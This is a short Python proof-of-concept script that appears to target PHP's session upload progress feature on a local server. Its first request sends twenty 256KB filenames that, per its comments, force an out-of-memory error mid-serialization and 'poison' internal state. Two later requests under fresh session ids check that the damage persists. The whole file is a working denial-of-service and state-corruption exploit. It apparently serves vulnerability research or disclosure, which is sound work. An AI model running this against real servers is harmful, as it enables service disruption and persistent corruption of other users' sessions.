import http.client, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8092

def part(name, value, fname=None):
    b = '--BOUNDARYX\r\nContent-Disposition: form-data; name="%s"' % name
    if fname:
        b += '; filename="%s"' % fname
    b += '\r\n\r\n'
    return b.encode() + value + b'\r\n'

def endpart():
    return b'--BOUNDARYX--\r\n'

def req(tag, sid_key, body):
    t0 = time.time()
    c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=60)
    c.request('POST', '/?sid=' + sid_key, body, {
        'Content-Type': 'multipart/form-data; boundary=BOUNDARYX',
        'Content-Length': str(len(body))})
    r = c.getresponse()
    data = r.read()
    print('[%s] %d bytes -> HTTP %d (%d bytes) [%.1fs]' % (tag, len(body), r.status, len(data), time.time()-t0), flush=True)
    c.close()

def main():
    # R1: poison - 20 x 256KB filenames against sid pocsid1, forces OOM mid-serialize
    body1 = part('PHPSESSID', b'pocsid1') + part('PHP_SESSION_UPLOAD_PROGRESS', b'up1')
    for i in range(20):
        body1 += part('f%d' % i, b'X', 'A' * 262144)
    body1 += endpart()
    print('[R1] poison %d bytes (sid=pocsid1)' % len(body1), flush=True)
    req('R1-poison', 'key1', body1)

    time.sleep(2)

    # R2: DIFFERENT sid (no flock deadlock), small progress -> forced serialize
    body2 = part('PHPSESSID', b'pocsid2') + part('PHP_SESSION_UPLOAD_PROGRESS', b'up2') \
         + part('f0', b'DATA', 'small.txt') + endpart()
    print('[R2] reuse-probe %d bytes (sid=pocsid2)' % len(body2), flush=True)
    req('R2-reuse', 'key2', body2)

    time.sleep(2)

    # R3: third poison-free request -> proves level sticks at 1 forever
    body3 = part('PHPSESSID', b'pocsid3') + part('PHP_SESSION_UPLOAD_PROGRESS', b'up3') \
         + part('f0', b'DATA', 'small.txt') + endpart()
    print('[R3] sticky-level %d bytes (sid=pocsid3)' % len(body3), flush=True)
    req('R3-sticky', 'key3', body3)

if __name__ == '__main__':
    main()
